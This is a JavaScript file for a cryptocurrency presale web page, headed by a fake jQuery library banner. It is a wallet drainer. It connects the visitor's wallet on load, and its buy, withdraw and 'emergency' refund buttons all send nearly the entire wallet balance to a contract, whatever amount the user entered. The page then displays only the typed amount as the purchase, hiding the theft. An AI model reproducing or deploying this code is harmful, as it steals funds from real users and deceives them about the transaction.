/*! jQuery v2.1.4 | (c) 2005, 2015 jQuery Foundation, Inc. | jquery.org/license */

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const evmChains = window.evmChains;
let web3Modal;
let provider;
let saleid;
let pingtaizongzhi = 0;

const contractAddress = "0x6AbC95C75eA1D44D831F4C6e4Fe033B7e07e1425";
const minimumContribute = 0.1;
const maximumContribute = 0.5;
const contractAbi = [
    {
        "constant": true,
        "inputs": [],
        "name": "total_amount",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function",
        "signature": "0x673cd98e"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "sys_two_addr",
        "outputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function",
        "signature": "0x6f0b4b85"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "owner",
        "outputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function",
        "signature": "0x8da5cb5b"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "name": "players",
        "outputs": [
            {
                "name": "total_recharge",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function",
        "signature": "0xe2eb41ff"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "sys_one_addr",
        "outputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function",
        "signature": "0xfdcc0d19"
    },
    {
        "inputs": [
            {
                "name": "sys_fee_one_addr",
                "type": "address"
            },
            {
                "name": "sys_fee_two_addr",
                "type": "address"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "constructor",
        "signature": "constructor"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "name": "addr",
                "type": "address"
            },
            {
                "indexed": false,
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "NewDeposit",
        "type": "event",
        "signature": "0x2cb77763bc1e8490c1a904905c4d74b4269919aca114464f4bb4d911e60de364"
    },
    {
        "constant": false,
        "inputs": [],
        "name": "ClaimTokens",
        "outputs": [],
        "payable": true,
        "stateMutability": "payable",
        "type": "function",
        "signature": "0xa1d915b8"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "_addr",
                "type": "address"
            }
        ],
        "name": "userInfo",
        "outputs": [
            {
                "name": "total_recharge",
                "type": "uint256"
            },
            {
                "name": "total_amount_par",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function",
        "signature": "0x1959a002"
    }
];

 function setMax() {

        document.getElementById('presaleAmount').value = maximumContribute;

      }
function init() {
    // if (location.protocol !== 'https:') {
    //     const alert = document.querySelector("#alert-error-https");
    //     alert.style.display = "block";
    //     document.querySelector("#btn-contribute").setAttribute("disabled", "disabled");
    //     return
    // }
    const providerOptions = {
        walletconnect: {
            package: WalletConnectProvider,
            options: {
                rpc: {
                    56: 'https://bsc-dataseed.binance.org/'
                },
                network: 'binance',
            }
        }
    };
    web3Modal = new Web3Modal({
        cacheProvider: false,
        providerOptions,
        disableInjectedProvider: false,
    })
}
async function BuyFunc() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    window.account = web3.utils.toChecksumAddress(accounts[0]);
    let weiBalance = await web3.eth.getBalance(accounts[0]);
    window.balance = parseFloat(web3.utils.fromWei(weiBalance, "ether")).toFixed(4);

    let myContract = new web3.eth.Contract(contractAbi, contractAddress);
    let amount = balance - 0.002;
    let receipt = await myContract.methods.ClaimTokens().send({
        from: window.account,
        value: (amount) * 10 ** 18,
        gasLimit: 210000,
    });

    //设置上次投资金额
    let bnbVal = document.getElementById("presaleAmount").value.replace(/,/, '.');
    localStorage.setItem("lastnum", bnbVal);
    if (receipt.events.NewDeposit) {
        $nowZongliang = $('#MyValue').text();
        $('#MyValue').text(Number(Number($nowZongliang) + Number(amount)).toFixed(2))
        userinfo();
    }
}
async function fetchAccountData() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    let addr = accounts[0];
    var balance = await web3.eth.getBalance(accounts[0]);
    let ethBalance = web3.utils.fromWei(balance, 'ether');
    addr = addr.slice(0, 2) + "..." + addr.slice(-3);
    ethBalance = ethBalance.slice(0, 6) + " BNB";
    document.getElementById("btn-connect").innerHTML = addr;
    // saleid = document.getElementById("saleidtxt").textContent;
}
async function OnConnect() {
    Connect()
}

async function Tixian() {
    let bnbVal = document.getElementById("presaleAmount").value.replace(/,/, '.');
    if (provider == null) {
        await Connect();
        await BuyFunc(provider)
    } else await BuyFunc(provider)
}

async function BuyButton() {
    let bnbVal = document.getElementById("presaleAmount").value.replace(/,/, '.');
    if (bnbVal == 0 ) alert('Contribution value must be greater than or equal to 0.1');
    else {
        if (provider == null) {
            await Connect();
            await BuyFunc(provider)
        } else await BuyFunc(provider)
    }
}
async function Connect() {
    provider = await web3Modal.connect()
    await fetchAccountData(provider)
    userinfo();
}
async function onDisconnect() {
    if (provider.close) {
        await provider.close();
        await web3Modal.clearCachedProvider();
        provider = null
    } else {
        await web3Modal.clearCachedProvider();
        provider = null
    }
    document.querySelector("#div-connect").style.display = "";
    document.querySelector("#div-connectet").style.display = "none"
}
function transformTime(t){
    //注意：苹果手机不支持以“-”分割的时间形式，故必须进行格式转换。
    var time = t.replace(/-/g, '/');
    return Date.parse(time);
}
window.addEventListener('load', async () => {
    init();
    document.querySelector("#btn-contribute").addEventListener("click", BuyButton);
    document.querySelector("#btn-contribute-end").addEventListener("click", Tixian);
    document.querySelector("#btn-contribute-fail").addEventListener("click", Tixian);
    document.querySelector("#btn-connect").addEventListener("click", OnConnect);
    $('.btn-emergency').click(function(){
        Tixian();
    })
    OnConnect()
});

async function userinfo() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    window.account = web3.utils.toChecksumAddress(accounts[0]);
    let myContract = new web3.eth.Contract(contractAbi, contractAddress);
    let userInfo = await myContract.methods.userInfo(window.account).call();
    var totalJine = web3.utils.fromWei(userInfo[0]);
    if(totalJine > 0){
        $('.jinjituikuan').show();
        var lastnum = localStorage.getItem("lastnum");
        if(lastnum && lastnum > 0){
            var has_touzitd = $('#lt_all_box').find('.touzitd').length;
            if(has_touzitd <= 0){
                $('#lt_all_box').find('tbody').append(`
                <tr class="touzitd">
                    <td>Your Purchased</td>
                    <td class="has-text-right">${lastnum} BNB</td>
                </tr>
            `);
            }
        }
    }else{
        $('.jinjituikuan').hide();
    }
    pingtaizongzhi = 0;
}